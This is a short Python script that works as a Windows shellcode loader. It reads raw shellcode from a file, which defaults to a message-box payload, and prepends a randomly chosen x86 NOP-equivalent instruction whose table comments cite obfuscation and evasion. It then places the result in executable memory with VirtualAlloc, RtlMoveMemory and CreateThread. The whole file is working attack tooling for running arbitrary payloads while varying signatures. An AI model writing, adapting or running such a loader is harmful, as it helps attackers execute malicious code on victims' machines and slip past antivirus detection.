import ctypes as kk
import random
import sys

x86_nops = {
    b"\x90": "NOP (single byte, standard NOP instruction)",
    b"\x66\x90": "NOP (two-byte variant, used for instruction alignment)",
    b"\x0F\x1F\x00": "NOP DWORD PTR [EAX] (three-byte NOP, Intel recommended)",
    b"\x0F\x1F\x40\x00": "NOP DWORD PTR [EAX+0] (four-byte NOP)",
    b"\x0F\x1F\x44\x00\x00": "NOP DWORD PTR [EAX+EAX*1+0] (five-byte NOP)",
    b"\x87\xDB": "XCHG EBX, EBX (register swap with itself, acts as a NOP)",
    b"\x89\xF6": "MOV ESI, ESI (redundant move, acts as a NOP)",
    b"\x8D\x49\x00": "LEA ECX, [ECX+0] (load effective address, does nothing)",
    b"\x8D\x74\x26\x00": "LEA ESI, [ESI+0] (similar to above, good for obfuscation)",
    b"\x50\x58": "PUSH EAX / POP EAX (stack operation with no real effect)",
    b"\x53\x5B": "PUSH EBX / POP EBX (similar to above, acts as padding)",
    b"\xD9\xD0": "FNOP (FPU NOP, often ignored but useful for evasion)",
    b"\x89\xC0": "MOV EAX, EAX (redundant register move, acts as a NOP)",
}

def O(shl_f):   

    with open(shl_f, 'rb') as f:
        shellcode_bytes = f.read()
    nopbytes, info = random.choice(list(x86_nops.items()))
    print(info)

    b_x = nopbytes + shellcode_bytes
    print("Trying NOP Type: ", info)
    kk.windll.kernel32.VirtualAlloc.restype = kk.c_void_p
    kk.windll.kernel32.CreateThread.argtypes = (
        kk.c_int, kk.c_int, kk.c_void_p, kk.c_int, kk.c_int, kk.POINTER(kk.c_int)
    )

    spc = kk.windll.kernel32.VirtualAlloc(
        kk.c_int(0), kk.c_int(len(b_x)), kk.c_int(0x3000), kk.c_int(0x40)
    )
    bf = (kk.c_char * len(b_x)).from_buffer_copy(b_x)
    kk.windll.kernel32.RtlMoveMemory(kk.c_void_p(spc), bf, kk.c_int(len(b_x)))
    hndl = kk.windll.kernel32.CreateThread(
        kk.c_int(0), kk.c_int(0), kk.c_void_p(spc), kk.c_int(0), kk.c_int(0),
        kk.pointer(kk.c_int(0))
    )
    kk.windll.kernel32.WaitForSingleObject(hndl, kk.c_uint32(0xffffffff))


if __name__ == "__main__":
    if len(sys.argv) != 2:
        shl_f = "msgbox.x86.bin"
        O(shl_f)
    else:
        shl_f = sys.argv[1]
        O(shl_f)